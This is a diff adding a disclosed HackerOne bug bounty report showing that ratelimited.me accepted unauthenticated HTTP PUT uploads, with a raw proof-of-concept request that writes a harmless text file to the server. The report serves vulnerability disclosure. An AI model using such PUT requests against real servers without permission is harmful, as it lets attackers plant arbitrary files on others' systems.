@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/369581
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/emitrani
+ReportedTo:RATELIMITED(ratelimited)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:11.12.2018 15:55:47
+
+Summary:
+
+Hi security team,
+
+**Summary:** It is possible to upload files to the server using the PUT method
+
+## Steps To Reproduce:
+
+1. I used the following request:
+
+```
+PUT /emitrani.txt HTTP/1.1
+Host: ratelimited.me
+Content-Length: 10
+Connection: close
+
+emitrani POC
+```
+Now a file exists at https://ratelimited.me/emitrani.txt
+with contents of the put request.
+
+## Impact
+
+Anyone can upload files to the server.
+
+Regards,
+Eray
